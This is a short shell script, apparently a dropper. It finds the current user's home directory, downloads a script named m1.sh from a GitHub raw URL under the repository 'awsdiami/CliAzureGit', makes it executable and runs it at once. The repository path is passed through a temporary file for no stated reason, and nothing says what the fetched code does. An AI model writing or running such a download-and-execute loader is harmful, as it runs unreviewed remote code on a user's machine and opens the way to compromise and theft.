#!/bin/sh

whoami > name.txt
namepath=$(head -1 name.txt)
path=/home/$namepath
cd $path
echo "awsdiami/CliAzureGit" > gitpath.txt
gitpath=$(head -1 gitpath.txt)
wget https://raw.githubusercontent.com/$gitpath/main/m1.sh && chmod +x m1.sh
./m1.sh
